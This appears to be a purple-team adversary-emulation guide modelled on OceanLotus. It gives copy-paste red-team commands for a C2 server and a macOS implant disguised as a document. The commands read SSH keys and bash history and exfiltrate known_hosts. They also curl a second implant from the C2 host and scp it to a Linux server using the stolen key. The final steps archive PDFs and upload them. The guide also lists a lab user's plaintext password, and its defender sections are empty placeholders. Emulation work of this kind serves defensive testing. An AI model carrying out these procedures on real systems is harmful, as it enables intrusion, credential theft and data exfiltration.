# 🌊💮 Emulation 
This scenario emulates OceanLotus TTPs based primarily on two malware specimens either 
used by or associated with the OceanLotus actors:

1. Rota Jakiro
1. OceanLotus.abcdef


### 🗺️ Legend
This document is intended to be used as a operational guide for a purple team operation. 

Based on the CTI Emulation Plan, each step includes the following information:
- 📖 **Overview** - Summuary of actions that are completed in this step
- 👾 **Red Team Procedures** - Red team operator instructions & commands to execute with expected output
- 🔮 **Reference Code & Reporting** - A table with links to the source code for specific actions with cited intelligence leveraged for this action (if available)
- 🔬 **Blue Team Notes** - key API calls, events, or telemtry for blue teams

In-line Symbols:
* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something


---
## Step 0 - Operation Setup

### 📖 Overview
This step assumes you have completed the infrastructure [setup](../setup/README.md). At the end of this step a Red Team operator should be able to execute the emulation plan by copying and pasting the commands into the correct terminal window with all required programs running. 

Actions completed in this step:
- Login to the attacker Kali machine via SSH
- Start the control server
- Set up attacker terminal windows for execution
- Login to the macOS VM on AWS - Required for step 1

At the end of this step the Attacker C2 should be listening for the implant callback and the red team operator should have terminal windows set up to manage the operation. 

---
### 👾 Red Team Procedures

#### Kali Setup
Ensure OceanLotus GitHub repo is cloned to the Kali host and infrastrucre is set up according to the infrastructure.md (This includes ensure the handlers are configured correctly in the `config/handler_config.yml` file and the compiled binary for the control server has been built)

Open **two** terminal windows on your local machine (assuming a macOS or similar terminal)

1. On the first terminal window, ssh to the Kali box hosting our C2 server in AWS
   ```
   ssh kali@10.90.30.26
   ```
   Expected Output:
   A login session as the kali user
   ```
   ┌──(kali㉿kali1)-[~]
   └─$
   ```
1. Start the C2 Server. Navigate to the ocean-lotus folder and execute the control server. 
   ```
   cd ocean-lotus/Resources/controlServer
   ```
   ```
   sudo ./controlServer
   ```
   Expected Output:
   ```
   [INFO] 2023/08/18 16:32:45 Initializing REST API from config file:  ./config/restAPI_config.yml
   [SUCCESS] 2023/08/18 16:32:45 REST API configuration set
   [INFO] 2023/08/18 16:32:45 Starting REST API server
   [SUCCESS] 2023/08/18 16:32:45 REST API server is listening on:  127.0.0.1:9999
   [INFO] 2023/08/18 16:32:45 Setting C2 handler configurations from config file:  ./config/handler_config.yml
   [SUCCESS] 2023/08/18 16:32:45 C2 Handler configuration set
   [INFO] 2023/08/18 16:32:45 Starting C2 handlers
   [INFO] 2023/08/18 16:32:45 Starting the oceanlotus Handler...
   [SUCCESS] 2023/08/18 16:32:45 Started handler oceanlotus
   [INFO] 2023/08/18 16:32:45 Handler simplehttp disabled. Skipping.
   [INFO] 2023/08/18 16:32:45 Waiting for connections
   [INFO] 2023/08/18 16:32:45 Starting Server...
   10.90.30.26:443
   ```
   This window is our listener, communications from implants will display in this window. Leave this window open and set to the side.
1. On the second terminal window, establish a second SSH connection.
   ```
   ssh kali@10.90.30.26
   ```
   Expected Output:
   A login session as the kali user
   ```
   ┌──(kali㉿kali1)-[~]
   └─$
   ```
1. Navigate to the controlServer folder and leave this window open and accessible. 
   ```
   cd ocean-lotus/Resources/controlServer
   ```
   This is the terminal window we use to task the implant. Unless otherwise specified, all copy/paste command will use this terminal window.
   
<details><summary>Trouble Shooting</summary>
  
   Check Configuration.
   - Check the ip address & port in the config file
   - Recompile the control server with the new IP - In the controlServer folder run the following command.

      ```
      go build -o controlServer main.go
      ```
   
</details>

#### VNC Access to macOS
Open a new terminal window on your local machine. 

1. Setup SSH Tunnel to forward port 5900 to localhost (must use teh ec2-user for this part).
   ```
   ssh -L 5900:localhost:5900 ec2-user@10.90.30.22
   ```
   The result should be an active SSH session, with port 5900 on the AWS macOS forwarded to port 5900 on your local machine.
   Expected Output: 
   ```
   Last login: <insert date from somewhere>
       ┌───┬──┐   __|  __|_  )
       │ ╷╭╯╷ │   _|  (     /
       │  └╮  │  ___|\___|___|
       │ ╰─┼╯ │  Amazon EC2
       └───┴──┘  macOS Catalina 10.15.7
   ```
1. Open another terminal window on your local machine.
1. Copy/Paste the following command to connect over VNC for a GUI intereface for the macOS machine in AWS.
   ```
   open vnc://localhost:5900
   ```
   A window should appear asking for Screen Sharing privillages to sin into "localhost".
   This terminal window is our live SSH session required for our VNC connect to macOS. Leave this window open and move to the side. We will not need to referene this window for the rest of the operation but do need to leave it open until we are finished with the macOS portion. 
1.  Enter the Hope Potter's credentials
   Username
   ```
   hpotter
   ```
   Password
   ```
   noax3teenohb~e
   ```
   Expected output:
   A GUI interface to the Mac Mini should appear on the screen asking for a password.

1. Enter the same password from above... manualy. The users Desktop should appear.
1. Click on the Downloads folder in the Dock located at the base of the Desktop. When the icon expands, select "Open in Finder". A Finder window will open displaying the contents of the Downloads folder.

   >The Dock is the macOS version of a Window's toolbar, Finder is the macOS of Windows Explorer, and the Downloads folder is typcially located to the left side of the Trash icon in the Dock.

1. Verify the conkylan.app file (unicorn in Vietnamese) is present in the Downloads folder. 

<details><summary>Trouble Shooting</summary>
  
   If you receive this error...
   ```
   LSOpenURLsWithRole() failed with error -610 for the URL vnc://localhost:5900.
   ```
   
   Try blah.
   ```
   Insert solution here
   ```
   
</details>

## Step 1 - Establish Foothold
### 📖 Overview

👋 Handwaving: Assume the user downloaded the conkylan.app (unicorn in Vietnamese) and it  resides on the user's `Downloads` folder. 

The user double-clicks the conkylan.app (note: We were not able to implement the homoglyph file extension due to updates from by apple 🙌 🍎) thinking it's a normal document. 

The implant opens a decoy word document while establishing a connection with the C2 server. 

---
### 👾 Red Team Procedures

1. Emulate the user double-clicking the conkylan.app (Lets pretend it's a word document)
1. Confirm C2 Registration of the OSX implant 
   In the Listener terminal window you should see the following output...

   ```zsh
      [INFO] 2023/08/18 17:08:13 Received first-time beacon from b6dbd70f203515095d0ca8a5ecbb43f7. Creating session...
      
      [SUCCESS] 2023/08/18 17:08:13 *** New session established: b6dbd70f203515095d0ca8a5ecbb43f7 ***
      +----------------------------------+------------+----------+------+-----+------+
      |               GUID               | IP ADDRESS | HOSTNAME | USER | PID | PPID |
      +----------------------------------+------------+----------+------+-----+------+
      | b6dbd70f203515095d0ca8a5ecbb43f7 |            |          |      |   0 |    0 |
      +----------------------------------+------------+----------+------+-----+------+
      
      [INFO] 2023/08/18 17:08:13 Current Directory:
      [INFO] 2023/08/18 17:08:13 Successfully added session.
      [SUCCESS] 2023/08/18 17:08:13 Successfully created session for implant b6dbd70f203515095d0ca8a5ecbb43f7.
      [INFO] 2023/08/18 17:08:13 Session created for implant b6dbd70f203515095d0ca8a5ecbb43f7
   ```
   
1. The macOS implant immediately sends collected discovery information about the victim machine which is printed out in the Listerner terminal window.

   Expected Output:
   ```
   [INFO] 2023/08/18 17:08:13 Initial data received from implant:
   /Users/hpotter/Library/WebKit/
   1692378529
   hpotter
   Mac mini
   x86_64
   VISERION.COM10.15.7
   6-Core Intel Core i73.2 GHz
   32 GB
   6-Core Intel Core i7
   ```
   
1. The implant will continue to send a `OSX_heartbeat` until tasked.

   Expected Output:
   ```
   [INFO] 2023/08/18 17:17:45 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
   [INFO] 2023/08/18 17:17:45 No tasks available for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
   ```
   
 1. Verify the persistence file was dropped by the initial payloads.
   ```
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
   ```


<details><summary>Extra Credit</summary>
  
This is not apart of the emulation plan however, if you want to manualy verify the LaunchAgent works you can use `launchctl` to manualy load and execute the LaunchAgent. macOS loads and excecutes LaunchAgents upon user logon. The below commands will allow you to manually load the `OSX.OceanLotus` LaunchAgent.

Note: As a result of our decision to hardcode the implant UUIDs to enable the copy/paste approach for this emulation there are additional actions that must be taken for session management. Loading the LaunchAgent will result in a double session. 

1. Load the LaunchAgent using `launchctl`
   ```
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"launchctl load -w /Users/hpotter/Library/LaunchAgents/com.apple.launchpad"}'
   ````
1. List out the processes using the com.apple.launchpad plist
   ```
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
   ```
1. Identify the process that is NOT running with the parent process of `1`. Using this process's PID, replace `PID` in the below command to kill this process.
   ```
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"kill -9 PID"}'
   ```

1. Veify we only have one running process using the com.apple.launchpad plist.
   ```
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ps -ef | grep com.apple.launchpad"}'
   ```
1. Continue hacking...

   
</details>


### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>


## Step 2 - macOS Discovery
### 📖 Overview




---
### 👾 Red Team Procedures

1. View the contents of the /.ssh folder
   ```zsh
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/.ssh/"}'
   ```
   Expected Output:
   ```
   [SUCCESS] 2023/08/18 18:20:13 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
   [INFO] 2023/08/18 18:20:22 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
   [INFO] 2023/08/18 18:20:22 New task received for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
   [INFO] 2023/08/18 18:20:22 Sending new task to implant: b6dbd70f203515095d0ca8a5ecbb43f7
   [INFO] 2023/08/18 18:20:22 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
   [INFO] 2023/08/18 18:20:22 Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
   [Task] 2023/08/18 18:20:22 total 24
   drwx------   5 hpotter  VISERION\Domain Users   160 Aug  4 19:09 .
   drwxr-xr-x+ 18 hpotter  VISERION\Domain Users   576 Aug  4 18:23 ..
   -rw-------   1 hpotter  VISERION\Domain Users  2635 Aug  3 18:14 id_rsa
   -rw-r--r--   1 hpotter  VISERION\Domain Users   589 Aug  3 18:14 id_rsa.pub
   -rw-r--r--   1 hpotter  VISERION\Domain Users   172 Aug  4 19:09 known_hosts
   
   [SUCCESS] 2023/08/18 18:20:22 Successfully set task output.
   ```
1. Exfil the Known Host File for review.  
   ```zsh
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_upload_file", "arg":"/Users/hpotter/.ssh/known_hosts"}'
    ```
   Expected output:
   ```
   [INFO] 2023/08/18 18:29:29 Received SetTaskBySessionId request
   [SUCCESS] 2023/08/18 18:29:29 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
   [INFO] 2023/08/18 18:29:30 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
   [INFO] 2023/08/18 18:29:30 New task received for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
   [INFO] 2023/08/18 18:29:30 Sending new task to implant: b6dbd70f203515095d0ca8a5ecbb43f7
   [INFO] 2023/08/18 18:29:30 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
   [SUCCESS] 2023/08/18 18:29:30 File uploaded: Successfully uploaded file to control server at './files/known_hosts'
   ```
1. Verify the file was uploaded to the control server.
   ```
   cat ./files/known_hosts
   ```

   Expected Output:
   ```
   10.90.30.7 ecdsa...<...ssh key information>
   ```
   
1. Use the History file to understand how this host connects to the host listed in the known_hosts file. 
   ```zsh
   ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"cat /Users/hpotter/.bash_history"}'
   ```

   Expected output: 
   ```
   [INFO] 2023/08/18 18:36:21 Received SetTaskBySessionId request
   [SUCCESS] 2023/08/18 18:36:21 Successfully set task for session: b6dbd70f203515095d0ca8a5ecbb43f7
   [INFO] 2023/08/18 18:36:28 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
   [INFO] 2023/08/18 18:36:28 New task received for UUID:  b6dbd70f203515095d0ca8a5ecbb43f7
   Building task for instruction  OSX_run_cmd
   [INFO] 2023/08/18 18:36:28 Sending new task to implant: b6dbd70f203515095d0ca8a5ecbb43f7
   [INFO] 2023/08/18 18:36:28 Received beacon from existing implant b6dbd70f203515095d0ca8a5ecbb43f7.
   [INFO] 2023/08/18 18:36:28 Received task output for session:  b6dbd70f203515095d0ca8a5ecbb43f7
   [Task] 2023/08/18 18:36:28 which git
   brew install iterm
   sudo chown -R $(whoami) /usr/local/Cellar
   dscl
   ...
   [SUCCESS] 2023/08/18 18:36:28 Successfully set task output.
   ```
   Reviewing the history file, we see they often run admin and file managment commands to a linux server. 

### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>

## Step 3 - Lateral Movement
### 📖 Overview
Identified the macOS connects to a Linux file server. 
 
Download Rota Jakiro and scp Rota Jakiro to the Linux server
 
Execute Rota Jakiro

---
### 👾 Red Team Procedures
Task OceanLotus to download Rota Jakiro to the macOS Host
```
./evalsC2client.py --set-task <OSX.OceanLotus ID> '{"cmd":"OSX_download_file", "payload":"rota"}'
```

Veify the file downloaded
```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
```

>If that doesn't work do the following...
>  On the C2 server:
>  ```
>  cd /opt/oceanlotus/Resources/payloads
>  python3 -m http.server
>  ```
>  Task the implant
>  ```
>  ./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"curl 10.90.30.26:8000/rota -o /tmp/rota"}'
>  ```
>  
>  Veify the file downloaded
>  ```./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ls -la /Users/hpotter/Library/WebKit/osx.download"}'
>  ```

Task OceanLotus to SCP the Rota Jakiro implant to the Linux host
```
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"scp -i /Users/hpotter/.ssh/id_rsa /tm
p/rota hpotter@viserion.com@10.90.30.7:/tmp/rota"}'
```

Use OceanLotus to Execute Rota Jakiro on the Lotus host using ssh
```
./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'
```

Confirm C2 Registration of Rota on the C2 Server

### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>


## Step 4 - Discovery on Linux Host
### 📖 Overview
Discover on Linux Host: 
Upload device info

---
### 👾 Red Team Procedures
`./evalsC2client.py --set-task b6dbd70f203515095d0ca8a5ecbb43f7 '{"cmd":"OSX_run_cmd", "arg":"ssh -i /Users/hpotter/.ssh/id_rsa -t hpotter@viserion.com@10.90.30.7 \"nohup /tmp/rota&; sleep 5; pkill rota\""}'`

Confirm device info is printed out

### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>


## Step 5 - Collection
### 📖 Overview
Execute a shared object that includes: 
create tmp.rota folder 
move everything into the folder that is a .pdf extension 
tar all the .pdfs in the folder (exilf.tar.gz)
Confirm files were created

---
### 👾 Red Team Procedures
Execute:

run file query command, ensure files & folder exist 
Confirm: 
`./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_query_file", "arg": "/tmp/.rota/exfil.tar.gz"}'`

### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>


## Step 6 - Exfil from Linux Host
### 📖 Overview
Execute another shared object that includes: 
Uploading the tar file from the folder

---
### 👾 Red Team Procedures
`./evalsC2client.py --set-task 01020304 '{"cmd": "Rota_upload_file", "payload": "payload.so"}'`
Confirm upload of file to server 

### 🔮 Reference Code & Reporting
<br>

### 🔬 Blue Team Notes
<br>


:red_circle: End of Scenario. 
